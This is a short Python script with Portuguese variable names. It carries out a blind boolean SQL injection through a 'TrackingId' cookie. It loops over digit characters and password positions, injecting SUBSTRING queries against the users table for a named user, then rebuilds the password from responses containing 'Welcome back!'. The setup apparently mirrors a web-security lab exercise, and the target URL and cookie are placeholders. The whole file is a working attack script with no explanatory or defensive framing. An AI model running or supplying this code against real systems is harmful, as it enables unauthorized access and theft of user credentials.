import requests
from datetime import datetime

class SenhaDecod():         
    def __init__(self):   
        self.Algarismo = None  
        self.Letra = None  

now = datetime.now()
current_time = now.strftime("%H:%M:%S" )
print("Inicio execucao =", current_time)

url = '--INSIRA A URL--'
valorCookie = "--INSIRA O COOKIE--"
labelResposta = "Welcome back!"
usuario='Bart Simpsom'

algarismosSenha = [] 
offSetSenha = [1,2,3,4,5]
strSenhaDecod = ""
sqlInjection = ""
dicionarioDoAtaque = ['0','1','2','3','4','5','6','7','8','9'] 

for letra in dicionarioDoAtaque: 
    for algarismo in offSetSenha: 
        sqlInjection ="' AND (SELECT SUBSTRING(password,'"+ str(algarismo) +"',1) FROM users WHERE username='"+ usuario +"')='"+ letra 
        ck={"TrackingId": valorCookie + sqlInjection } 
        response=requests.get(url,cookies=ck)
        
        if response.text.find(labelResposta) > 0:
            objSenha = SenhaDecod() 
            objSenha.Algarismo = algarismo 
            objSenha.Letra = letra
            algarismosSenha.append(objSenha)  

contadorSenha = 1

for algarismo in offSetSenha: 
    for parteSenha  in algarismosSenha: 
        if (parteSenha.Algarismo == contadorSenha):
            strSenhaDecod += parteSenha.Letra 
            contadorSenha += 1
            break

print("Senha codificada:"+strSenhaDecod)
now = datetime.now()
current_time = now.strftime("%H:%M:%S" )
print("fim execucao =", current_time)